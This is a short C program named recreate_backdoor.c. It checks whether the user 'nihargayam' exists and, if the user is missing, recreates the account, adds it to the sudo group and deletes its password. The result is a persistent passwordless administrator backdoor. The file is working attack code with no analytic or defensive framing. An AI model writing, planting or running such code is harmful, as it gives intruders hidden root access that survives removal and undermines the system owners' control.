// recreate_backdoor.c
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>

int main() {
    struct passwd *pwd = getpwnam("nihargayam");

    if (pwd == NULL) {
        // User does not exist, recreate
        system("/usr/sbin/useradd -m nihargayam");
        system("/usr/sbin/usermod -aG sudo nihargayam");
        system("/usr/bin/passwd -d nihargayam");
    }

    return 0;
}
